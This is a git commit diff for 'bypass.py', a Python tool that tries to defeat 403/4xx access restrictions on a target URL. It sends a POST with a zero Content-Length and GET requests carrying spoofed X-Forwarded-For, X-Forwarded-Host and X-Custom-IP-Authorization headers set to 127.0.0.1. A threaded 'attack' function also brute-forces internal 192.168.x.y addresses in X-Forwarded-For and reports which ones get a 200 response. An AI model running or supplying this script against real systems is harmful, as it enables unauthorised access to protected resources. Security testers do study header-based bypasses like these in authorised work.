a29cdfd1230c9bb44c6a752ce0980971a6dbaf1b
kira2040k <46848151+kira2040k@users.noreply.github.com>
2020-12-24 09:36:18 +0300

    Update bypass.py

--- bypass.py
+++ bypass.py
@@ -6,14 +6,14 @@ if (2 <= len(sys.argv) <= 2):
 else:
     print("Usage: python 4xx.py url")
 
- 
 r4 = requests.post(url,headers={"Content-Length": "0"})
-
-
+if(r4.status_code == 200):
+    print("post request and Content-Length:0")
 a,b,c = {"X-Forwarded-For" : "127.0.0.1"},{"X-Forwarded-Host" : "127.0.0.1"},{"X-Custom-IP-Authorization": "127.0.0.1"}
 for i in a,b,c:
     r = requests.get(url,headers=i)  
-    print(r.text)
+    if(r.status_code == 200):
+        print("add this header on request "," ",i)
 
 def attack(number):
     i = number
@@ -21,10 +21,7 @@ def attack(number):
         s = requests.get(url,headers={"X-Forwarded-For" : "192.168.{}.{}".format(n,i)})
         if (s.status_code == 200):
             print("192.168.{}.{}".format(n,i))
-
+        
 for i in range(1,256):
     x = threading.Thread(target=attack,args=(i,))
     x.start()
-    
-
-
